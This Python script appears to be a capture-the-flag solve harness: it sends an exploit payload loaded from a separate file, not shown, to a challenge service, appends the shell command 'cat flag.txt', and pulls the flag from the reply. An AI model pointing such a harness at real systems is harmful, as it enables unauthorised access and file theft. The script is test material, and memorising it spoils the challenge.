#!/usr/bin/env python3
from __future__ import annotations

import os
import re
import socket
from pathlib import Path


HOST = os.environ.get("HOST", "target")
PORT = int(os.environ.get("PORT", "8154"))
FLAG_RE = re.compile(rb"[A-Za-z0-9_]+\{[^}]*\}")


def recv_all(sock: socket.socket) -> bytes:
    chunks: list[bytes] = []
    while True:
        try:
            chunk = sock.recv(4096)
        except TimeoutError:
            break
        if not chunk:
            break
        chunks.append(chunk)
    return b"".join(chunks)


def main() -> None:
    payload_path = Path(__file__).with_name("solve.txt")
    payload = payload_path.read_bytes()

    with socket.create_connection((HOST, PORT), timeout=10) as sock:
        sock.settimeout(3)
        sock.sendall(payload + b"cat flag.txt\n")
        output = recv_all(sock)

    match = FLAG_RE.search(output)
    if not match:
        raise SystemExit(output.decode(errors="replace") or "flag not found")
    print(match.group(0).decode())


if __name__ == "__main__":
    main()
